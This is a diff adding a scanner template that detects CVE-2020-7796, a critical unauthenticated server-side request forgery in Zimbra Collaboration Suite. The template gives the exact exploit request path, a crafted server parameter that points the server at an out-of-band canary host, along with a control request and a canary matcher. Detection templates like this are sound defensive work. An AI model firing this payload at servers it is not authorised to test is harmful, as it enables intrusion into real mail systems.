@@ -1,0 +1,25 @@
+id: "zimbra-preauth-ssrf"
+name: "Zimbra Collaboration Suite - Server-Side Request Forgery"
+severity: "critical"
+description: "Zimbra Collaboration Suite (ZCS) allows remote unauthenticated attackers to cause the product to include content returned by third-party servers and use it as its own code."
+tech:
+  - "tomcat"
+  - "java"
+tags:
+  - "zimbra"
+  - "ssrf"
+  - "oast"
+  - "vuln"
+cve: "CVE-2020-7796"
+reference: "https://www.adminxe.com/2183.html"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/service/error/sfdc_preauth.jsp?session=s&userid=1&server={{guardian_canary_http}}%23.salesforce.com/"
+control:
+  method: "GET"
+  path: "/service/error/sfdc_preauth.jsp?session=s&userid=1&server=guardian-none-{{rand}}%23.salesforce.com/"
+matchers-condition: "or"
+matchers:
+  - type: "canary"
+    protocol: "http"
